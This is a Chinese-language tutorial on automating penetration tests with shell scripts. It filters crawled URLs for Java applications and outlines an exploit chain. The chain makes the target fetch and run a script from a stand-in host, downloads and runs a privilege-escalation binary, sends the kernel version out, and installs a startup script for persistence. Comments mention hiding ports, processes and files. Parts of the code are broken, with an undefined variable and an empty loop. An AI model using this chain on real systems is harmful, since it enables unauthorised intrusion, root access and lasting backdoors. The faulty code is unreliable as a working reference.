## 分析shell脚本，自动化渗透
如果不会shell编程，这里需要自己自学shell编程。

### 0x00 理解自动化
自动化渗透，也就是流水线般的去做渗透测试。
在个人看来渗透主要分三步骤，什么样的需求①，达到什么样的目的②，最终结果③，渗透的主要三个步骤。
以目前的技术要达到完全的自动化，还无法做到，只能做到针对性强，非常有局限的自动化。
但是可以通过需求、目的、结果来进行建模，就类似搭积木一样，可以应对大部分情况。

### 0x01 需求
分析漏洞需求，在满足什么样的条件触发exp。比如Java反序列化漏洞，明确的知道哪些应用程序使用了该
技术，通过特征过滤包含这些应用程序特征的程序。
例如，我需要过滤*.do,*.action,*.jsp后缀的名字来确认是否使用java编写的应用程序
```shell
#!/bin/sh
#过滤所有URL,对java应用程序进行渗透测试
URL=`cat 1.log | grep -Eo "<a[^>]+?href=[\"']?([^\"']+)[\"']?[^>]*>([^<]+)</a>"`
#过滤do或者jsp或者action的query请求。
JSP=`echo $URL | grep -Eo "http[s]?://([A-Za-z0-9\.]*)?/[0-9a-zA-Z0-9/]+([^\.jsp]+)\.jsp"`
DO=`echo $P | grep -Eo "http[s]?://([A-Za-z0-9\.]*)?/[0-9a-zA-Z0-9/]+\.do([\?]?[^\"']+)?"`

ANYLIST=()
LIST=$JSP$DO
foreach(){
	for url in $LIST;do
		#执行目标
	done
	echo 
	return 0;
}

```


### 0x02 目的
满足需求后执行我们的目的，也就是漏洞利用，但是在利用之前，要确定，如果成功，需要做什么事情，
那么，一般黑帽做到这步的情况，就是提权留后门，由于我们只做测试检测，所以，在这里，就只要求服务器向
我们的中间服务器发送一个带kernel参数的POST，来确定目标系统的版本。
```shell
#!/bin/sh
#执行目标
exp $url
#exp的实现，根据java的各种漏洞，如java反序列化，struts2等漏洞（如果是此类型漏洞可能还需要进一步
#确定，如果无法确认，放入任意漏洞检测队列）。
#构造请求包，执行系统调用，大致实现是
while read line
do 
    data="$data${line}"
done < data.dat
exp(){
	#构造一个请求包，向服务器发送请求。目标服务器下载中间服务器脚本程序执行。
	#data的数据类似data=curl -k -L http://www.example.com/curl-exp.sh -o curl-exp.sh && 
	#chmod +x curl-exp.sh && /bin/sh curl-exp.sh 
	curl -k -L $1 -F "data=$data"
}
#实现一个隐藏端口，隐藏进程，隐藏文件的`linux mod`,
#由于这里做检测，所以只实现一个http请求。
#daemon-exp.sh
daemon_exp(){
	KK=`uname -a`
	curl -k -L -F "kernel="$KK http://www.example.com/push.php 
}
#编写`shell init`放到启动项里根据不同情况触发，如：`/etc/init/[rc0.d,rc1.d,rc2.d,rc3.d,rc4.d]`
#把daemon-exp.sh放入rc3.d开机启动里面；

#运行程序
#curl_exp.sh

CURL=`which curl`
if [ "$CURL" = "" ];then
	exit 1;
fi
if [ $? != 0 ];then
	exit 1;
fi

#此处下载执行隐藏端口，隐藏进程，隐藏文件的命令脚本
curl -k -L http://www.example.com/daemon-exp.sh -o daemon-exp.sh #shell-init script
#su
curl -k -L http://www.example.com/su.out -o su.out #执行提权，用最高权限执行shell脚本
chmod +x $(pwd)/su.out
./su.out daemon-exp.sh
exit 0;


```

### 0x03 结果
验证中间服务器收到的请求，确定目标机存在漏洞。
查看已经成功运行我们的exp脚本服务器。

PS：
①需求，这里指满足条件。
②目的，在满足需求的情况下，是否要拿到root权限，留下后门等。
③结果，完成所有目的操作，无任何异常或者错误。

